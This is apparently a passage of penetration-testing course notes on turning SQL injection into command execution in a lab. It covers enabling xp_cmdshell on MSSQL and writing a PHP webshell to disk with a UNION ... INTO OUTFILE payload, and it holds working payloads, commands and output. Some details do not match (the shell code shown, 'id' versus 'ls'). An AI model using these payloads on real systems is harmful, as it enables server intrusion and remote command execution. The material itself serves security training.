MSSQL webshell via sqli

In Microsoft SQL Server, the xp_cmdshell function takes a string and passes it to a command shell for execution. 
The function returns any output as rows of text. 
The function is disabled by default and, once enabled, it must be called with the EXECUTE keyword instead of SELECT.

In our database, the Administrator user already has the appropriate permissions. 
Let's enable xp_cmdshell by simulating a SQL injection via the impacket-mssqlclient tool.

kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
Enabling xp_cmdshell feature

After logging in from our Kali VM to the MSSQL instance, we can enable show advanced options by setting its value to 1, then applying the changes to the running configuration via the RECONFIGURE statement. 
Next, we'll enable xp_cmdshell and apply the configuration again using RECONFIGURE.
With this feature enabled, we can execute any Windows shell command through the EXECUTE statement followed by the feature name.

SQL> EXECUTE xp_cmdshell 'whoami';
output
nt service\mssql$sqlexpress
NULL
Executing Commands via xp_cmdshell

Since we have full control over the system, we can now easily upgrade our SQL shell to a more standard reverse shell.

Although the various MySQL database variants don't offer a single function to escalate to RCE, we can abuse the SELECT INTO_OUTFILE statement to write files on the web server.
For this attack to work, the file location must be writable to the OS user running the database software.
As an example, let's resume the UNION payload on our MySQL target application we explored previously, expanding the query that writes a webshell on disk.
We'll issue the UNION SELECT SQL keywords to include a single PHP line into the first column and save it as webshell.php in a writable web folder.

' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
Write a WebShell To Disk via INTO OUTFILE directive

The written PHP code file results in the following:

<? system($_REQUEST['cmd']); ?>
PHP reverse shell

The PHP system function will parse any statement included in the cmd parameter coming from the client HTTP REQUEST, thus acting like a web-interactive command shell.
If we try to use the above payload inside the Lookup field of the search.php endpoint, we receive the following error:

Fortunately, this error is related to the incorrect return type, and should not impact writing the webshell on disk.
To confirm, we can access the newly created webshell inside the tmp folder along with the id command.

192.168.191.x/tmp/webshell.php?cmd=ls

Great! The webshell is working as expected, since the output of the id command is returned to us through the web browser. 
We discovered that we are executing commands as the www-data user, an identity commonly associated with web servers on Linux systems.

Now that we understand how to leverage SQLi to manually obtain command execution, let's discover how to automate the process with specific tools.
